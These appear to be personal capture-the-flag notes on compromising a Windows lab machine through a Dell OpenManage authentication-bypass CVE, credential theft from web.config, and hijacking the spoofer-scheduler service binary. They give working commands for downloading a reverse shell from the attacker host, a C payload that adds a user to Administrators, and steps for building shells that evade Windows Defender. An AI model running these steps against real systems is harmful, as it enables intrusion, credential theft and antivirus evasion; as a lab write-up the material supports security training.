Initial scans show ports 21,22,80,3389,1311 open
Nothing of use in any of them, except 1311
1311 shows some Dell software, upon clicking "about", we see it is OpenManage 9.4.2
No results on searchsploit
But there was an article, which said explained how, despite patching the vuln in 9.4.0 , the vulnerability kind of still existed, where we can bypass the authentication, and perform some file reads, by fooling the software into thinking the creds are legit, and to give us the SesshID

https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2020-5377_CVE-2021-21514/README.md

---
`python CVE-2020-5377.py 10.17.34.38 10.201.95.173:1311` and it gives us an interactive console, to enter the file name, which we can read
First, I googled where the creds are stored for IIS, and found 
`%systemroot%\System32\Inetsrv\config\applicationHost.config`systemroot =Windows
from which, we find `physicalPath="C:\inetpub\wwwroot\hacksmartersec`
In our notes, we also have written how there are password files in wwwroot\web.config
So, we tried to read "C:\inetpub\wwwroot\hacksmartersec\web.config", which had the creds for user tyler, and it worked for ssh
`ssh tyler@10.201.95.173`
not much on privesc normal methods

---
But on mannual enum, we find a dir in C:\Program Files (x86)\Spoofer
In the CHANGES.txt, we see it is a CAIDA spoofer 1.4.6
googling for exploits, we find it has a unquoted service path and the name of the service
Alternatively, couldve done `ps`, and shouldve spotted spoofer-scheduler
`sc qc "spoofer-scheduler"`
`C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe`
But, we dont have write permissinos in the C:\ or C:\Program
However, icacls spoofer-scheduler.exe showed we have FULL access over it
This meant we could replace the file itself with any exe
Also, it'll only work, if we have priv to stop and start the service. to check this,
`accesschk64.exe -qlc spoofer-scheduler`

---
Tried sending over a msfvenom package, but it was caught and deleted by Windows Defender!
So, we need to upload a reverse shell that wont be caught by it, and we come across this-

```hyerlink
https://github.com/Sn1r/Nim-Reverse-Shell
```
change the ip, port
compile
```zsh
nim c -d:mingw --app:gui rev_shell.nim
```

```powershell
sc.exe stop spoofer-scheduler
curl http://10.17.34.38/rev_shell.exe spoofer-scheduler.exe
sc.exe start spoofer-scheduler
```
while listening on the kali, we get an admin shell, but it ==keeps dying within a minute==
In this case, you can quickly setup persistence using a new user, so that we can ssh back into the machine

---
OR
Alternatively, we write a C code that would grant admin priv to the low user, and run that service
```c
#include <stdlib.h>
int main() {
  system("cmd.exe /c net localgroup Administrators tyler /add");
  return 0;
}
```
`x86_64-w64-mingw32-gcc-win32 payload.c -o payload.exe` to compile it for windows
transfer it to windows using curl
```powershell
sc.exe stop spoofer-scheduler
mv payload.exe spoofer-scheduler
sc.exe start spoofer-scheduler
```
However, this did not work, and kept failing

----
==THE SHELL THAT DOESNT DIE -- GO==
Reverse shell evading antivirus detection, evading windows defender

`go run SecUp.go 10.17.34.38`
starts the engine, where we can do the LHOST, LPORT thing
Here, it generates a few files, like payload, and other files it needs to survive
**update_script.go** is the payload file, set to call back 443 (so listen at 443)

`GOOS=windows go build update_script.go`
compiles the .go file to .exe file

Now, it is up to us, to change the generated update_script.exe to whatever file name we need, transfer it to the windows machine (not on port 80, as the code has an internal server running at 80,8080 . So use something like 4848) and run it in the windows machine.

---
TODO - explore - iexpress.exe way to do it as well
ps2.exe 
python to .exe

they try to convert either .bat, .ps or .py to exe, in which we can add the user and give him admin priv, then send it to that machine as printer-spoofer